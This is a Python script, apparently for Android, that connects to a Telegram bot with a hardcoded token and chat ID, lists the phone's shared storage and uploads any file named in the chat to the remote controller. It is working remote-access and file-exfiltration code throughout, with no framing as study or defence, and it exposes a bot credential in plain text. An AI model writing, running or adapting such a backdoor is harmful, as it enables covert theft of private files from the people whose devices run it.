import os
import requests
import json

# Replace with your bot token and chat ID
TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
CHAT_ID = '6285177516'

# Global variable to store current folder path
current_folder = "/storage/emulated/0/"

# Function to send message to Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Error sending message: {str(e)}")

# Function to get storage file and folder list
def get_storage_list(folder_path):
    try:
        # List all files and folders in the specified folder
        file_list = os.listdir(folder_path)
        if file_list:
            return file_list
        else:
            return "No files or folders found."
    except Exception as e:
        return f"Error getting file list: {str(e)}"

# Function to download a specific file
def download_file(file_name):
    try:
        file_path = os.path.join(current_folder, file_name)
        
        if os.path.isfile(file_path):
            # Send the file to Telegram
            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
            files = {'document': open(file_path, 'rb')}
            data = {"chat_id": CHAT_ID}
            response = requests.post(url, files=files, data=data)
            
            if response.status_code == 200:
                return f"File `{file_name}` sent successfully!"
            else:
                return f"Failed to send file. Status code: {response.status_code}, Response: {response.text}"
        else:
            return f"File `{file_name}` does not exist or is not a valid file."
    except Exception as e:
        return f"Error downloading file: {str(e)}"

# Function to handle folder navigation
def handle_folder_navigation(folder_name):
    global current_folder
    try:
        # Update the current folder path
        new_folder_path = os.path.join(current_folder, folder_name)
        
        if os.path.isdir(new_folder_path):
            current_folder = new_folder_path
            file_list = get_storage_list(current_folder)
            if isinstance(file_list, list):
                # Send the list of files and folders to Telegram
                file_list_message = f"*Contents of `{current_folder}`:*\n"
                file_list_message += "\n".join([f"`{file}`" for file in file_list])
                file_list_message += "\n\nSend the file name to download it, or folder name to navigate."
                send_to_telegram(file_list_message)
            else:
                send_to_telegram(file_list)
        else:
            send_to_telegram(f"`{folder_name}` is not a valid folder.")
    except Exception as e:
        send_to_telegram(f"Error navigating folder: {str(e)}")

# Telegram bot logic to handle file and folder requests
def handle_telegram_update(update):
    try:
        message = update.get('message', {}).get('text', '')
        if message:
            # If the message is a folder name, try to navigate
            folder_path = os.path.join(current_folder, message)
            if os.path.isdir(folder_path):
                handle_folder_navigation(message)
            else:
                # Otherwise, assume it's a file name and try to download
                response_message = download_file(message)
                send_to_telegram(response_message)
    
    except Exception as e:
        send_to_telegram(f"Error in Telegram update: {str(e)}")

# Example of how to handle incoming Telegram updates
def listen_for_updates():
    last_update_id = None
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    
    while True:
        params = {'timeout': 100, 'offset': last_update_id}
        response = requests.get(url, params=params)
        updates = response.json().get('result', [])
        
        for update in updates:
            last_update_id = update['update_id'] + 1
            handle_telegram_update(update)

if __name__ == "__main__":
    # Step 1: Start in the base folder and show the list of files/folders
    send_to_telegram(f"Current folder: `{current_folder}`")
    handle_folder_navigation("")  # Show initial folder contents
    
    # Step 2: Listen for user input (folder or file name)
    listen_for_updates()
 
